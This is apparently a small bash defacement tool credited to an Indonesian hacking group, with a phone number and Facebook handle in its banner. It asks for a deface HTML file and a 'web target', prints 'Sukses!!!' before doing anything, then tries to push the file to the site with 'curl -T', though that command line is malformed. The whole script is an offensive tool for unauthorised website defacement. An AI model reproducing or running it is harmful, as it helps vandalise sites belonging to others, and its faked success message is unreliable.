clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'

echo $cyan"_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—"
echo $cyan"_—                                                        _—"
echo $cyan"_—             MOD BY : ArjunTamfanz                      _—"
echo $cyan"_—                                                        _—"
echo $cyan"_—             Team   : Anonymous Gombong                 _—"
echo $cyan"_—                                                        _—"
echo $cyan"_—           Facebook : Fahry Jr                          _—"
echo $cyan"_—                                                        _—"
echo $cyan"_—           Contact  : 083869752666                      _—"
echo $cyan"_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—"



echo
python2 keren.py
echo
echo ""
sleep 1


echo "masukan script anda /sdcard/ Contoh :index.html ${endc}:"|lolcat
read sc


echo "web target: "| lolcat
read web

echo "Proses..." | lolcat
sleep 2
echo
echo "Sukses!!!" | lolcat

curl -T /sdcard/$sc/$web
echo "${y} (HASIL)" $web/$sc |lolcat
